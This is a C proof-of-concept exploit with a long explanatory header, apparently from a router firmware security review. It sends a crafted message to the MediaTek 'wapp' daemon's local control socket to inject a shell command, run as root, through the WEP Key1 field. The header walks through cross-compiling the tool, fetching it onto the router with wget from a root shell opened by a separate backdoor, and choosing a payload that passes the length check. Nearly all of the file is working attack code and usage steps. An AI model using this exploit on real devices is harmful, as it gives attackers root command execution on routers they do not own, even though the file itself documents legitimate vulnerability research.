/*
 * wapp_poke.c -- sends a crafted WAPP_USER_SET_WIRELESS_SETTING message
 * directly to wapp's local abstract-namespace control socket ("\0wapp_server")
 * to trigger CMDI-01 (WEP Key1 -> iwpriv -> system() injection).
 *
 * This talks to the LOCAL socket wapp itself listens on (same convention as
 * hostapd_cli's ctrl_iface: bind your own abstract address, send
 * "ATTACH:<suffix>" once, then send the real binary command from the same
 * socket -- wapp matches the peer by its bound sockaddr, not by any token).
 * It does NOT craft a real over-the-air/over-the-wire 1905.1 EasyMesh CMDU
 * frame -- that would be the genuinely pre-auth-remote path (raw Ethernet,
 * ethertype 0x893a) and requires reversing how the real 1905.1 daemon
 * (sbin/p1905_managerd, unreviewed this engagement) translates a network
 * CMDU into this same local message before relaying it to wapp. This tool
 * only proves the SINK itself: that a correctly-shaped local message really
 * does reach wdev_set_sec_and_ssid() and execute an injected shell command
 * as root. Run this from a root shell on the router itself (e.g. the one
 * BACKDOOR-01 gives you on TCP/25000) -- it will not work from a remote PC,
 * abstract sockets are not network-reachable.
 *
 * Build (on your own PC, cross-compiling for the router's aarch64 kernel --
 * fully static so it does not matter that the router uses musl, not glibc):
 *   sudo apt-get install gcc-aarch64-linux-gnu   # one-time
 *   aarch64-linux-gnu-gcc -static -O2 -o wapp_poke wapp_poke.c
 *
 * Transfer to the router (from the root shell BACKDOOR-01 gave you, the
 * router itself has wget/curl/tftp -- confirmed present in this firmware):
 *   # on your PC, in the directory holding the compiled binary:
 *   python3 -m http.server 8000        # or any other way to serve the file
 *   # on the router's root shell:
 *   wget http://<your-pc-ip>:8000/wapp_poke -O /tmp/wapp_poke
 *   chmod +x /tmp/wapp_poke
 *
 * Usage on the router:
 *   /tmp/wapp_poke <target_mac> <5-or-10-byte-payload>
 *   e.g.: /tmp/wapp_poke aa:bb:cc:dd:ee:ff ';touch /a;'
 *   (that payload is exactly 10 bytes -- see the length-gate note below)
 *
 * Then check whether the injected command ran, e.g.:
 *   ls -la /a
 *
 * IMPORTANT -- payload length: wdev_set_sec_and_ssid() only proceeds past
 * its own gate if strlen(payload) is EXACTLY 5 or 10 bytes (a length check,
 * not a charset check -- see the candidate doc). The template it builds is
 *   iwpriv <ifname> set Key1=<payload>;
 * with no quoting at all, so any shell metacharacter in your payload works.
 * A convenient 10-byte payload that injects a whole extra command and still
 * leaves the template's own trailing ';' as a harmless no-op is:
 *   ;touch /a;    (semicolon, "touch /a", semicolon = exactly 10 bytes)
 *
 * IMPORTANT -- target MAC: must match a wireless interface wapp's own
 * internal registry already knows about (populated from the real Wi-Fi
 * driver at runtime -- this is exactly what QEMU could not provide, and
 * exactly why this needs real hardware). Find real interface MACs on the
 * router itself, e.g.:
 *   ifconfig -a | grep -i hwaddr
 *   ip link show
 * Try the actual AP-client/backhaul-style interface first (commonly named
 * apclii0/apcli0/apclii1 etc. on this vendor's MediaTek SDK builds) --
 * the wdev registry lookup is keyed by which real interfaces wapp itself
 * manages, not by every MAC the device has.
 *
 * This is the first real attempt at exercising this exact local-socket path
 * outside of decompile-only analysis -- the wire format below is read
 * directly from this firmware's own decompile (candidates/wapp_dispatch_full.log,
 * wapp_iface_receive.log, wapp_ifaceprocess_full.log, wapp_fillsecinfo.log),
 * but has not been dynamically confirmed end-to-end (QEMU blocked on the
 * empty wdev registry, and this tool has not yet been run against a real
 * unit). If it doesn't work first try: check whether wapp logs anything
 * (syslog, or wherever this firmware's e_logv/e_logc calls end up) about a
 * rejected ATTACH or a failed MAC lookup, and report back what you see.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>

#define WAPP_SERVER_ABSTRACT_NAME "wapp_server"   /* real name is "\0wapp_server" */
#define OUR_ABSTRACT_NAME         "wapp_poke_cli" /* arbitrary -- just needs to be unique-ish */

static int make_abstract_sock(const char *name, struct sockaddr_un *out) {
    memset(out, 0, sizeof(*out));
    out->sun_family = AF_UNIX;
    out->sun_path[0] = '\0';
    strncpy(out->sun_path + 1, name, sizeof(out->sun_path) - 2);
    return 0;
}

static int parse_mac(const char *s, unsigned char mac[6]) {
    unsigned int b[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6)
        return -1;
    for (int i = 0; i < 6; i++) mac[i] = (unsigned char)b[i];
    return 0;
}

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "usage: %s <target_mac aa:bb:cc:dd:ee:ff> <5-or-10-byte payload>\n", argv[0]);
        fprintf(stderr, "example: %s aa:bb:cc:dd:ee:ff ';touch /a;'\n", argv[0]);
        return 1;
    }

    unsigned char mac[6];
    if (parse_mac(argv[1], mac) != 0) {
        fprintf(stderr, "bad MAC format, expected aa:bb:cc:dd:ee:ff\n");
        return 1;
    }

    const char *payload = argv[2];
    size_t plen = strlen(payload);
    if (plen != 5 && plen != 10) {
        fprintf(stderr, "WARNING: payload is %zu bytes -- wdev_set_sec_and_ssid()'s own\n"
                         "length gate requires EXACTLY 5 or 10 bytes, anything else is\n"
                         "silently rejected before your command ever runs. Sending anyway\n"
                         "in case this gate differs from the static analysis, but expect\n"
                         "no effect.\n", plen);
    }
    if (plen > 65) {
        fprintf(stderr, "payload too long (max 65 bytes, the wire field's own cap)\n");
        return 1;
    }

    int fd = socket(AF_UNIX, SOCK_DGRAM, 0);
    if (fd < 0) { perror("socket"); return 1; }

    struct sockaddr_un our_addr;
    make_abstract_sock(OUR_ABSTRACT_NAME, &our_addr);
    socklen_t our_len = sizeof(sa_family_t) + 1 + strlen(OUR_ABSTRACT_NAME);
    if (bind(fd, (struct sockaddr *)&our_addr, our_len) < 0) {
        perror("bind (own abstract addr)");
        return 1;
    }

    struct sockaddr_un srv_addr;
    make_abstract_sock(WAPP_SERVER_ABSTRACT_NAME, &srv_addr);
    socklen_t srv_len = sizeof(sa_family_t) + 1 + strlen(WAPP_SERVER_ABSTRACT_NAME);

    /* Step 1: ATTACH so wapp registers our bound sockaddr as a known peer. */
    char attach_msg[] = "ATTACH:poke";
    if (sendto(fd, attach_msg, strlen(attach_msg), 0,
               (struct sockaddr *)&srv_addr, srv_len) < 0) {
        perror("sendto ATTACH");
        return 1;
    }

    char resp[64];
    ssize_t n = recv(fd, resp, sizeof(resp) - 1, 0);
    if (n > 0) {
        resp[n] = '\0';
        fprintf(stderr, "ATTACH response: %s", resp);
    } else {
        fprintf(stderr, "no ATTACH response (may still be fine -- wapp_iface_receive's"
                         " own response behavior wasn't dynamically confirmed this session)\n");
    }

    /* Step 2: build the map_handler / map_config_wireless_setting_msg message. */
    unsigned char buf[9 + 1 + 110];
    memset(buf, 0, sizeof(buf));
    buf[0] = 0x82;                 /* WAPP_USER_SET_WIRELESS_SETTING */
    unsigned short total_len = (unsigned short)sizeof(buf);
    memcpy(&buf[3], &total_len, 2);  /* optional length clamp -- endianness not confirmed, best guess */

    unsigned char *payload_start = &buf[9];
    payload_start[0] = 1;          /* record count N = 1 */
    unsigned char *rec = &payload_start[1];
    memcpy(&rec[0], mac, 6);                 /* target interface MAC */
    unsigned short authmode = 1;             /* "Open" -- avoids early-return paths */
    unsigned short enctype  = 2;             /* MUST be 2 -> decodes to "WEP" */
    memcpy(&rec[0x27], &authmode, 2);
    memcpy(&rec[0x29], &enctype, 2);
    memcpy(&rec[0x2b], payload, plen);       /* injection point -- raw, unvalidated memcpy */

    if (sendto(fd, buf, sizeof(buf), 0, (struct sockaddr *)&srv_addr, srv_len) < 0) {
        perror("sendto map_handler message");
        return 1;
    }

    fprintf(stderr, "Sent. Check on the router whether the injected command ran.\n");
    close(fd);
    return 0;
}
